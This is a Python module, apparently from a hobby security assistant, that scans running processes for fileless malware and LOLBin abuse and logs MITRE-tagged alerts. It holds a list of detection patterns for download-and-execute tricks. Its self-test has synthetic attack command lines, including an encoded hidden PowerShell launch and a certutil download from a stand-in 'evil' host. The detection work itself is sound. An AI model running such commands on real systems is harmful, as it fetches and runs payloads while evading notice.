"""
J.A.R.V.I.S — Process / Fileless-Malware Monitor
Inspects running processes for behaviour typical of fileless malware and
living-off-the-land attacks: encoded PowerShell, scripting interpreters
spawned with suspicious flags, and binaries executing from temp folders.

Maps to MITRE ATT&CK:
  T1059 / T1059.001 — Command and Scripting Interpreter / PowerShell
  T1055             — Process Injection (fileless indicators)
"""

import re
import threading
import time

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from security.event_store import get_store, Severity


# Interpreters commonly abused for living-off-the-land execution
LOL_BINARIES = {
    "powershell.exe", "powershell", "pwsh.exe", "cmd.exe",
    "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe",
    "regsvr32.exe", "wmic.exe", "certutil.exe",
}

# Command-line fragments that strongly suggest obfuscated/fileless execution
SUSPICIOUS_FLAGS = [
    r"-enc(?:odedcommand)?\b",      # powershell -EncodedCommand
    r"-e\s+[A-Za-z0-9+/=]{30,}",    # base64 blob after -e
    r"-w\s+hidden", r"-windowstyle\s+hidden",
    r"-nop\b", r"-noprofile\b",
    r"frombase64string", r"downloadstring", r"downloadfile",
    r"iex\b", r"invoke-expression",
    r"bypass\b",                    # -ExecutionPolicy Bypass
    r"certutil.*-urlcache", r"certutil.*-decode",
    r"mshta.*http", r"regsvr32.*scrobj",
]

# Directories that are unusual for legitimate executables
TEMP_HINTS = ("\\temp\\", "/temp/", "\\tmp\\", "/tmp/",
              "\\appdata\\local\\temp", "\\downloads\\")

_flag_re = re.compile("|".join(SUSPICIOUS_FLAGS), re.IGNORECASE)


class ProcessMonitor:
    """Scans processes for fileless / LOLBin indicators."""

    def __init__(self):
        self._running = False
        self._thread = None
        self.store = get_store()
        self._alerted_pids = set()

    def scan(self):
        if not PSUTIL_AVAILABLE:
            return "Sir, I require the 'psutil' library to inspect processes."
        findings = self._inspect_all()
        if not findings:
            return "No suspicious processes detected, sir. Execution environment is clean."
        lines = [f"{f['name']} (PID {f['pid']}): {f['reason']}" for f in findings]
        for f in findings:
            self._record(f)
        return ("Alert, sir. Suspicious process activity detected:\n" +
                "\n".join(lines))

    def _inspect_all(self):
        findings = []
        for proc in psutil.process_iter(["pid", "name", "cmdline", "exe"]):
            try:
                finding = self._assess(proc.info)
                if finding:
                    findings.append(finding)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return findings

    def _assess(self, info):
        name = (info.get("name") or "").lower()
        cmdline = " ".join(info.get("cmdline") or [])
        exe = (info.get("exe") or "").lower()
        reasons = []
        severity = Severity.LOW
        mitre = "T1059"

        is_lolbin = name in LOL_BINARIES
        flag_hit = _flag_re.search(cmdline)

        if is_lolbin and flag_hit:
            reasons.append(f"obfuscated/encoded command ({flag_hit.group(0).strip()})")
            severity = Severity.HIGH
            mitre = "T1059.001" if "powershell" in name or "pwsh" in name else "T1059"
        elif flag_hit:
            reasons.append(f"suspicious flag ({flag_hit.group(0).strip()})")
            severity = Severity.MEDIUM

        # Executable running from a temp/download directory
        if exe and any(h in exe for h in TEMP_HINTS):
            reasons.append("executable running from temp/download folder")
            severity = max(severity, Severity.MEDIUM)
            if not reasons[:-1]:
                mitre = "T1055"

        if not reasons:
            return None
        return {
            "pid": info.get("pid"),
            "name": info.get("name") or "unknown",
            "cmdline": cmdline[:300],
            "reason": ", ".join(reasons),
            "severity": severity,
            "mitre": mitre,
        }

    def _record(self, f):
        self.store.log_event(
            source="process_monitor",
            severity=f["severity"],
            threat_type="Fileless / Suspicious Process",
            message=f"{f['name']} (PID {f['pid']}): {f['reason']}",
            mitre_id=f["mitre"],
            details=f"Command line: {f['cmdline']}",
            mitigation=("Investigate the process and its parent. If unrecognised, "
                        "terminate it, isolate the host from the network, and run "
                        "a full malware scan."),
        )

    def start_monitor(self):
        if not PSUTIL_AVAILABLE:
            return "Sir, I require the 'psutil' library to monitor processes."
        if self._running:
            return "Process monitor is already active, sir."
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        return "Process monitor activated, sir. Watching for fileless execution."

    def stop_monitor(self):
        self._running = False
        return "Process monitor deactivated, sir."

    def _loop(self):
        while self._running:
            for proc in psutil.process_iter(["pid", "name", "cmdline", "exe"]):
                try:
                    pid = proc.info["pid"]
                    if pid in self._alerted_pids:
                        continue
                    finding = self._assess(proc.info)
                    if finding and finding["severity"] >= Severity.MEDIUM:
                        self._record(finding)
                        self._alerted_pids.add(pid)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            time.sleep(4)

    def get_status(self):
        if not self._running:
            return "Process monitor is offline, sir."
        return "Process monitor active. No fileless activity detected."


if __name__ == "__main__":
    # Self-test of the assessment logic with synthetic process data
    pm = ProcessMonitor()
    samples = [
        {"pid": 101, "name": "powershell.exe",
         "cmdline": ["powershell.exe", "-nop", "-w", "hidden", "-enc",
                     "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"],
         "exe": "c:\\windows\\system32\\powershell.exe"},
        {"pid": 102, "name": "chrome.exe",
         "cmdline": ["chrome.exe", "--type=renderer"],
         "exe": "c:\\program files\\google\\chrome\\chrome.exe"},
        {"pid": 103, "name": "update.exe",
         "cmdline": ["update.exe"],
         "exe": "c:\\users\\bob\\appdata\\local\\temp\\update.exe"},
        {"pid": 104, "name": "certutil.exe",
         "cmdline": ["certutil.exe", "-urlcache", "-f", "http://evil/x.exe"],
         "exe": "c:\\windows\\system32\\certutil.exe"},
    ]
    for s in samples:
        result = pm._assess(s)
        if result:
            print(f"[{result['severity'].label}] {result['name']} "
                  f"({result['mitre']}): {result['reason']}")
        else:
            print(f"[clean] {s['name']}")
